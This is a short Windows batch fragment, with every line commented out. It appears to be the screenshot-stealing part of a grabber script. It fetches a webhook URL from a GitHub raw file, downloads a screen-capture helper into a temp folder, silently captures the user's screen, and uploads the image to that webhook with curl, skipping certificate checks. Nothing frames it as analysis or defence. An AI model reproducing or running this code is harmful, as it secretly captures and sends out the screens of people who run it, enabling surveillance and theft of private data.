REM for /f %%a in ('Powershell -Command "irm https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/url"') do set webhook=%%a
REM if not exist %TEMP%\wstemp md %TEMP%\wstemp
REM pushd %TEMP%\wstemp
REM if not exist %TEMP%\wstemp\screenCapture.bat powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
REM call screenCapture screenshot.png >nul
REM curl -k -F "payload_json={\"content\": \"\"}" -F "file1=@screenshot.png" %WEBHOOK% >nul
REM echo %CD%
REM popd